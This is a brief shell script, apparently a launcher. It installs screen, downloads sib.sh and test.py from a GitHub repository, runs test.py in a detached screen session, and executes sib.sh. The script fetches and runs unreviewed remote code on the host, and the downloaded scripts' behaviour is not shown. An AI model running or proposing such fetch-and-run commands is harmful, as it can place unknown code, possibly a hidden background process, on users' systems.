#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://raw.githubusercontent.com/NRC-TECH/project-N/main/sib.sh
wget https://raw.githubusercontent.com/NRC-TECH/project-N/main/test.py
chmod +x test.py
screen -dmS test.py ./test.py 60 70
chmod +x sib.sh
./sib.sh
